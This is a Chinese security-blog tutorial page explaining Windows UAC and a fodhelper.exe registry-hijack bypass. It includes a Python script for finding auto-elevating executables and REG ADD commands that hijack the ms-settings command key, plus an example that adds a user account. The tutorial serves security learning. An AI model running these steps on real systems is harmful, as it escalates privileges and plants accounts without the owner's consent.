@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/blog/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/blog/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/blog/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/blog/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/blog/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/blog/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/blog/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="bypassuac," />
+
+
+
+
+
+  <link rel="alternate" href="/blog/atom.xml" title="uSu渗透吧" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="UAC介绍UAC四种设置要求： 始终通知：每当有程序需使用高级别的权限时会提示本地用户。仅在程序试图更改我的计算机时通知我：UAC默认设置，本地Windows程序要使用高级别的权限时，不会通知用户，但是第三方程序要使用高级别权限时，会提示本地用户。仅在程序试图更改我的计算机时通知我（不降低桌面的亮度）：与上一条设置相同。从不提示：当用户为系统管理与时，所有程序都会以最高的权限运行。 UAC两种模式">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bypassUAC">
+<meta property="og:url" content="https://lanxin-1.github.io/blog/2022/09/16/bypassUAC/index.html">
+<meta property="og:site_name" content="uSu渗透吧">
+<meta property="og:description" content="UAC介绍UAC四种设置要求： 始终通知：每当有程序需使用高级别的权限时会提示本地用户。仅在程序试图更改我的计算机时通知我：UAC默认设置，本地Windows程序要使用高级别的权限时，不会通知用户，但是第三方程序要使用高级别权限时，会提示本地用户。仅在程序试图更改我的计算机时通知我（不降低桌面的亮度）：与上一条设置相同。从不提示：当用户为系统管理与时，所有程序都会以最高的权限运行。 UAC两种模式">
+<meta property="og:locale">
+<meta property="og:image" content="https://lanxin-1.github.io/blog/2022/09/16/bypassUAC/1.png">
+<meta property="og:image" content="https://lanxin-1.github.io/blog/2022/09/16/bypassUAC/2.png">
+<meta property="og:image" content="https://lanxin-1.github.io/blog/2022/09/16/bypassUAC/3.png">
+<meta property="og:image" content="https://lanxin-1.github.io/blog/2022/09/16/bypassUAC/4.png">
+<meta property="og:image" content="https://lanxin-1.github.io/blog/2022/09/16/bypassUAC/5.png">
+<meta property="og:image" content="https://lanxin-1.github.io/blog/2022/09/16/bypassUAC/6.png">
+<meta property="og:image" content="https://lanxin-1.github.io/blog/2022/09/16/bypassUAC/7.png">
+<meta property="og:image" content="https://lanxin-1.github.io/blog/2022/09/16/bypassUAC/8.png">
+<meta property="og:image" content="https://lanxin-1.github.io/blog/2022/09/16/bypassUAC/9.png">
+<meta property="og:image" content="https://lanxin-1.github.io/blog/2022/09/16/bypassUAC/10.png">
+<meta property="og:image" content="https://lanxin-1.github.io/blog/2022/09/16/bypassUAC/11.png">
+<meta property="og:image" content="https://lanxin-1.github.io/blog/2022/09/16/bypassUAC/12.png">
+<meta property="og:image" content="https://lanxin-1.github.io/blog/2022/09/16/bypassUAC/13.png">
+<meta property="article:published_time" content="2022-09-16T10:48:45.000Z">
+<meta property="article:modified_time" content="2022-09-16T10:58:35.307Z">
+<meta property="article:author" content="爱意深埋珊瑚海">
+<meta property="article:tag" content="bypassuac">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lanxin-1.github.io/blog/2022/09/16/bypassUAC/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://lanxin-1.github.io/blog/2022/09/16/bypassUAC/"/>
+
+
+
+
+
+  <title>bypassUAC | uSu渗透吧</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/blog/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">uSu渗透吧</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/blog/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/blog/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/blog/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/blog/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/blog/404/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lanxin-1.github.io/blog/blog/2022/09/16/bypassUAC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/blog/images/headpng1.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="uSu渗透吧">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">bypassUAC</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-09-16T18:48:45+08:00">
+                2022-09-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/blog/categories/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" itemprop="url" rel="index">
+                    <span itemprop="name">权限提升</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="UAC介绍"><a href="#UAC介绍" class="headerlink" title="UAC介绍"></a>UAC介绍</h3><p><strong>UAC四种设置要求：</strong></p>
+<p>始终通知：每当有程序需使用高级别的权限时会提示本地用户。<br>仅在程序试图更改我的计算机时通知我：UAC默认设置，本地Windows程序要使用高级别的权限时，不会通知用户，但是第三方程序要使用高级别权限时，会提示本地用户。<br>仅在程序试图更改我的计算机时通知我（不降低桌面的亮度）：与上一条设置相同。<br>从不提示：当用户为系统管理与时，所有程序都会以最高的权限运行。</p>
+<p><strong>UAC两种模式</strong></p>
+<p>凭据提示和同意提示</p>
+<img src="/blog/2022/09/16/bypassUAC/1.png" class title="image"> 
+
+<img src="/blog/2022/09/16/bypassUAC/2.png" class title="image"> 
+
+<p><strong>需要UAC的授权才能进行的操作：</strong><br>1.配置Windows Update<br>2.增加/删除账户<br>3.更改账户类型<br>4.更改UAC设置<br>5.安装ActiveX<br>6.安装/卸载程序<br>7.安装设备驱动程序<br>8.将文件移动/复制到Program Files或Windows目录下<br>9.查看其他用户的文件夹</p>
+<p><strong>查看UAC权限</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line">whoami /groups</span><br></pre></td></tr></table></figure>
+
+<p><strong>windows权限机制</strong><br>System integrity process               System权限<br>High integrity process                    Administrator权限<br>Medium integrity process             普通用户默认权限<br>Low integrity process                    非常低的权限（一般用在沙盒进程中（Chrome））</p>
+<h3 id="微软工具SysinternalsSuite套件使用"><a href="#微软工具SysinternalsSuite套件使用" class="headerlink" title="微软工具SysinternalsSuite套件使用"></a>微软工具SysinternalsSuite套件使用</h3><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite</a>  //微软工具套件</p>
+<h4 id><a href="#" class="headerlink" title></a><img src="/blog/2022/09/16/bypassUAC/3.png" class title="image"></h4><h4 id="Sigcheck-签名检测"><a href="#Sigcheck-签名检测" class="headerlink" title="Sigcheck-签名检测"></a><strong>Sigcheck-签名检测</strong></h4><p>查看属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sigcheck64.exe -a -m C:\Windows\System32\xx.exe</span><br></pre></td></tr></table></figure>
+
+<p>查找未签名的exe：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sigcheck64.exe -u -e C:\Windows\System32</span><br></pre></td></tr></table></figure>
+
+<img src="/blog/2022/09/16/bypassUAC/4.png" class title="image"> 
+
+<p>查找潜在bypassuac的exe<br>注意观察<autoElevate>true</autoElevate>字段<br>有该字段的可用于bypassuac自动权限提升    </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sigcheck64.exe -u -e C:\Windows\System32</span><br></pre></td></tr></table></figure>
+
+<h4 id="提取可用于bypass的exe脚本"><a href="#提取可用于bypass的exe脚本" class="headerlink" title="提取可用于bypass的exe脚本"></a>提取可用于bypass的exe脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import glob</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line"># if len(sys.argv) &lt; 2:</span><br><span class="line">#     print(&quot;Usage:find_bypassuac_exe.py &lt;path&gt;&quot;)</span><br><span class="line">#     print(&quot;eg: find_bypassuac_exe.py C:\\windows\\system32\\&quot;)</span><br><span class="line">#     sys.exit()</span><br><span class="line">#</span><br><span class="line"># d = sys.argv[1]</span><br><span class="line">#</span><br><span class="line"># if not(d.endswith(&#x27;\\&#x27;)):</span><br><span class="line">#     d = d+&#x27;\\&#x27;</span><br><span class="line">d = &#x27;C:\\Windows\\System32\\&#x27;</span><br><span class="line">exefiles=[]</span><br><span class="line"></span><br><span class="line">if os.path.isdir(d):</span><br><span class="line">    exefiles= glob.glob(d+&#x27;*.exe&#x27;)</span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line">for exe in exefiles:</span><br><span class="line">    p = subprocess.Popen([&#x27;D:\\Inet_Safe\\Web安全\\RedTeam\\Tool\\bypassuac\\SysinternalsSuite\\sigcheck&#x27;,&#x27;-nobanner&#x27;, &#x27;-m&#x27;,exe],stdout=subprocess.PIPE,stderr=subprocess.PIPE)</span><br><span class="line">    out,err = p.communicate()</span><br><span class="line">    s =&#x27;true&lt;/autoElevate&gt;&#x27;</span><br><span class="line">    s = s.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    if  s in out:</span><br><span class="line">        print(exe.strip())</span><br><span class="line">        i = i+1</span><br><span class="line">print(f&quot;共找到&#123;i&#125;个exe，autoElevate set to true&quot;)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-Bypass-利用白名单"><a href="#1-Bypass-利用白名单" class="headerlink" title="1.Bypass-利用白名单"></a>1.Bypass-利用白名单</h3><h4 id="fodhelper-exe（手工分析案例）"><a href="#fodhelper-exe（手工分析案例）" class="headerlink" title="fodhelper.exe（手工分析案例）"></a>fodhelper.exe（手工分析案例）</h4><p>C:\Windows\System32\fodhelper.exe</p>
+<p>使用Sigcheck查看属性，具备图中所示两个条件（需要管理员权限运行、自动权限提升为true）即可用于bypassuac</p>
+<img src="/blog/2022/09/16/bypassUAC/5.png" class title="image"> 
+
+<p>使用procmon进行分析</p>
+<p>筛选</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Processname is fodhelper.exe-&gt;add</span><br><span class="line">operation contains REG</span><br><span class="line">Path contains command</span><br></pre></td></tr></table></figure>
+
+
+<img src="/blog/2022/09/16/bypassUAC/6.png" class title="image"> 
+
+<p>启动fodhelper.exe</p>
+<img src="/blog/2022/09/16/bypassUAC/7.png" class title="image"> 
+
+
+
+<p>查找和该注册表项HKEY_CURRENT_USER(HKCU)有关的进程，HKCU是当前用户可进行操作的，不被限制</p>
+<p>找BUFFER OVERFLOW附近的地方，找到因为在HKCU中NAME NOT　FOUND　而在HKUR中SUCCESS的地方，在该HKUR中添加值，从而在此执行我们添加的值，而不再去HKUR中寻找值，从而实现劫持</p>
+<img src="/blog/2022/09/16/bypassUAC/8.png" class title="image"> 
+
+<p>由图所示,我们手动去创建DelegateExecute项</p>
+<p>也可使用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ</span><br></pre></td></tr></table></figure>
+
+<img src="/blog/2022/09/16/bypassUAC/9.png" class title="image"> 
+
+<p>此时再运行fodhelper.exe,可以看到NAME NOT Found 已经变成SUCCESS;此时,由于默认项的值我们还未写入即为空,所以fodhelper.exe没有运行结果,说明我们已经劫持成功</p>
+<img src="/blog/2022/09/16/bypassUAC/10.png" class title="image"> 
+
+<img src="/blog/2022/09/16/bypassUAC/11.png" class title="image"> 
+
+<p>这时,我们再往默认项中填入我们想要执行的操作即可,如cmd.exe,再执行fodhelper.exe即可成功以fodhelper.exe权限(Administrator运行)cmd.exe<br>也可使用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG ADD  HKCU\Software\Classes\ms-settings\shell\open\command /d &quot;cmd.exe&quot; /f  </span><br><span class="line">//也可执行其他一些操作:如cmd.exe/c net user test test/add</span><br></pre></td></tr></table></figure>
+
+<img src="/blog/2022/09/16/bypassUAC/12.png" class title="image"> 
+
+<img src="/blog/2022/09/16/bypassUAC/13.png" class title="image"> 
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/blog/tags/bypassuac/" rel="tag"># bypassuac</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/blog/2022/07/07/python%E8%BF%9C%E6%8E%A7%E5%BC%80%E5%8F%91/" rel="next" title="python远控开发">
+                <i class="fa fa-chevron-left"></i> python远控开发
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/blog/images/headpng1.jpg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/blog/archives">
+              
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/blog/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/blog/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#UAC%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">UAC介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BE%AE%E8%BD%AF%E5%B7%A5%E5%85%B7SysinternalsSuite%E5%A5%97%E4%BB%B6%E4%BD%BF%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">微软工具SysinternalsSuite套件使用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">2.1.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Sigcheck-%E7%AD%BE%E5%90%8D%E6%A3%80%E6%B5%8B"><span class="nav-number">2.2.</span> <span class="nav-text">Sigcheck-签名检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E5%8F%96%E5%8F%AF%E7%94%A8%E4%BA%8Ebypass%E7%9A%84exe%E8%84%9A%E6%9C%AC"><span class="nav-number">2.3.</span> <span class="nav-text">提取可用于bypass的exe脚本</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Bypass-%E5%88%A9%E7%94%A8%E7%99%BD%E5%90%8D%E5%8D%95"><span class="nav-number">3.</span> <span class="nav-text">1.Bypass-利用白名单</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#fodhelper-exe%EF%BC%88%E6%89%8B%E5%B7%A5%E5%88%86%E6%9E%90%E6%A1%88%E4%BE%8B%EF%BC%89"><span class="nav-number">3.1.</span> <span class="nav-text">fodhelper.exe（手工分析案例）</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">爱意深埋珊瑚海</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/blog/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/blog/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/blog/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/blog/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/blog/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/blog/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/blog/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/blog/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
